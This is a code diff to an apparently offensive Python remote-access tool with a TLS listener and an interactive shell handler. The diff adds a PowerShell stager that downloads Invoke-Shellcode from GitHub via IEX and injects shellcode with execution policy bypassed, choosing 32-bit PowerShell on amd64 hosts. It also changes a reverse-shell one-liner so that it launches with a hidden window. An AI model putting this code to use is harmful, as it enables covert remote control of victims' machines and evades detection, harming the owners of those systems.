@@ -15,7 +15,7 @@ def startListener():
     time.sleep(0.25)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
+        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
     except:
         sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal + '\n>')
         sys.stdout.flush()
@@ -77,9 +77,21 @@ def interactShell(clientconn,clientnumber):
     return True
 
 
-def clientUpload(fileToUpload,clientconn,powershellExec):
-    print type(fileToUpload)
+def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
     if powershellExec:
+        if isExe:
+            powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
+            count = 0
+            newpayloadlayout = ''
+            for char in powershellShellcode:
+                count += 1
+                newpayloadlayout += char
+                if count == 4:
+                    newpayloadlayout += ','
+                    count = 0
+            encPowershell = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 20;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
+            encPowershell = base64.b64encode(encPowershell.encode('utf_16_le'))
+            powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if ($Arch -eq 'x86') {powershell -exec bypass -enc \"%s\"}elseif ($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
         clientconn.sendall(powershellExec)
     else:
         print type(fileToUpload)
@@ -103,7 +115,7 @@ def printListener():
         "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
         "$sl.Flush()};$c.Close()")
 
-    print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
+    print 'powershell.exe -WindowStyle Hidden -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
     return True
 
 def pingClients(clientconn,clientnumber):
@@ -117,3 +129,8 @@ def pingClients(clientconn,clientnumber):
             print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
             del clientMenuOptions[str(clientnumber)]
         sys.exit(1)
+
+
+"""
+
+    """
